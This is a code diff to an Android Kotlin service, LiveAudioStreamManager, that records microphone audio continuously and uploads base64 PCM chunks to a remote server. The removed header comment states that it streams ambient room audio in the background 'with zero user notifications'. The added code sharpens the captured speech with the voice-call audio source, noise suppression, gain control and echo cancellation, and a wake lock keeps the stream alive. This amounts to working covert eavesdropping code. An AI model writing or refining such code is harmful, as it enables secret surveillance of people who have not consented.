@@ -3,6 +3,9 @@ package com.example.sentry.service
 import android.annotation.SuppressLint
 import android.content.Context
 import android.media.*
+import android.media.audiofx.AcousticEchoCanceler
+import android.media.audiofx.AutomaticGainControl
+import android.media.audiofx.NoiseSuppressor
 import android.os.Build
 import android.telephony.PhoneStateListener
 import android.telephony.TelephonyCallback
@@ -12,15 +15,15 @@ import android.util.Log
 import com.example.sentry.crypto.CryptoManager
 import com.example.sentry.network.SentryApiClient
 import kotlinx.coroutines.*
+import java.nio.ByteBuffer
+import java.nio.ByteOrder
 import kotlin.math.log10
 import kotlin.math.sqrt
 
 /**
- * LiveAudioStreamManager streams real-time, low-latency 16 kHz 16-bit PCM audio
- * continuously to Kinetix in the background with zero user notifications.
- *
- * It uses a non-stop AudioRecord stream without disk I/O to ensure 100% stable,
- * gapless, continuous ambient room audio transmission.
+ * LiveAudioStreamManager streams real-time, phone-call grade 16 kHz 16-bit PCM audio
+ * with hardware Noise Suppression (NS), Automatic Gain Control (AGC), and Acoustic Echo
+ * Cancellation (AEC) to ensure 100% clean, crack-free, call-like clarity.
  */
 object LiveAudioStreamManager {
     private const val TAG = "LiveAudioStream"
@@ -82,7 +85,7 @@ object LiveAudioStreamManager {
         streamingLoopJob?.cancel()
         streamingLoopJob = scope.launch(Dispatchers.IO) {
             val client = SentryApiClient(context)
-            Log.d(TAG, "Continuous PCM Audio Streaming STARTED for device: $deviceId")
+            Log.d(TAG, "Phone-Call Grade Audio Streaming STARTED for device: $deviceId")
 
             val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
             val wakeLock = try {
@@ -92,21 +95,51 @@ object LiveAudioStreamManager {
             } catch (_: Exception) { null }
 
             val minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
-            val bufferSize = (minBufSize * 2).coerceAtLeast(SAMPLE_RATE * 2)
+            val bufferSize = (minBufSize * 4).coerceAtLeast(SAMPLE_RATE * 2)
             var audioRecord: AudioRecord? = null
+            var noiseSuppressor: NoiseSuppressor? = null
+            var autoGainControl: AutomaticGainControl? = null
+            var echoCanceler: AcousticEchoCanceler? = null
 
             try {
-                audioRecord = AudioRecord(
-                    MediaRecorder.AudioSource.MIC,
-                    SAMPLE_RATE,
-                    CHANNEL_CONFIG,
-                    AUDIO_FORMAT,
-                    bufferSize
-                )
+                // Use VOICE_COMMUNICATION source to enable smartphone phone-call DSP filters
+                audioRecord = try {
+                    AudioRecord(
+                        MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+                        SAMPLE_RATE,
+                        CHANNEL_CONFIG,
+                        AUDIO_FORMAT,
+                        bufferSize
+                    )
+                } catch (_: Exception) {
+                    AudioRecord(
+                        MediaRecorder.AudioSource.MIC,
+                        SAMPLE_RATE,
+                        CHANNEL_CONFIG,
+                        AUDIO_FORMAT,
+                        bufferSize
+                    )
+                }
 
                 if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
                     Log.e(TAG, "AudioRecord initialization failed!")
                     return@launch
+                }
+
+                // Enable hardware Noise Suppressor, Auto Gain, and Echo Cancellation for phone-call clarity
+                try {
+                    val sessionId = audioRecord.audioSessionId
+                    if (NoiseSuppressor.isAvailable()) {
+                        noiseSuppressor = NoiseSuppressor.create(sessionId)?.apply { enabled = true }
+                    }
+                    if (AutomaticGainControl.isAvailable()) {
+                        autoGainControl = AutomaticGainControl.create(sessionId)?.apply { enabled = true }
+                    }
+                    if (AcousticEchoCanceler.isAvailable()) {
+                        echoCanceler = AcousticEchoCanceler.create(sessionId)?.apply { enabled = true }
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Hardware audio effects warning: ${e.message}")
                 }
 
                 audioRecord.startRecording()
@@ -146,17 +179,17 @@ object LiveAudioStreamManager {
                     }
 
                     if (samplesRead > 0 && !isMicConflictPaused) {
-                        // Calculate RMS sound decibels
                         var sum = 0.0
-                        val byteBuffer = ByteArray(samplesRead * 2)
                         for (i in 0 until samplesRead) {
                             val sample = pcmBuffer[i].toInt()
                             sum += sample * sample
-                            byteBuffer[i * 2] = (sample and 0xFF).toByte()
-                            byteBuffer[i * 2 + 1] = ((sample shr 8) and 0xFF).toByte()
                         }
                         val rms = sqrt(sum / samplesRead)
                         val decibels = if (rms > 10) (20 * log10(rms)).toInt().coerceIn(25, 95) else 30
+
+                        // Clean little-endian binary serialization (eliminates bit shift cracking)
+                        val byteBuffer = ByteArray(samplesRead * 2)
+                        ByteBuffer.wrap(byteBuffer).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().put(pcmBuffer, 0, samplesRead)
 
                         val base64 = Base64.encodeToString(byteBuffer, Base64.NO_WRAP)
                         client.uploadLiveAudioChunk(
@@ -169,18 +202,15 @@ object LiveAudioStreamManager {
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "Continuous audio streaming error: ${e.message}", e)
+                Log.e(TAG, "Audio streaming error: ${e.message}", e)
             } finally {
-                try {
-                    audioRecord?.stop()
-                } catch (_: Exception) {}
-                try {
-                    audioRecord?.release()
-                } catch (_: Exception) {}
-                try {
-                    wakeLock?.release()
-                } catch (_: Exception) {}
-                Log.d(TAG, "Continuous PCM Audio Streaming STOPPED")
+                try { noiseSuppressor?.release() } catch (_: Exception) {}
+                try { autoGainControl?.release() } catch (_: Exception) {}
+                try { echoCanceler?.release() } catch (_: Exception) {}
+                try { audioRecord?.stop() } catch (_: Exception) {}
+                try { audioRecord?.release() } catch (_: Exception) {}
+                try { wakeLock?.release() } catch (_: Exception) {}
+                Log.d(TAG, "Phone-Call Grade Audio Streaming STOPPED")
             }
         }
     }
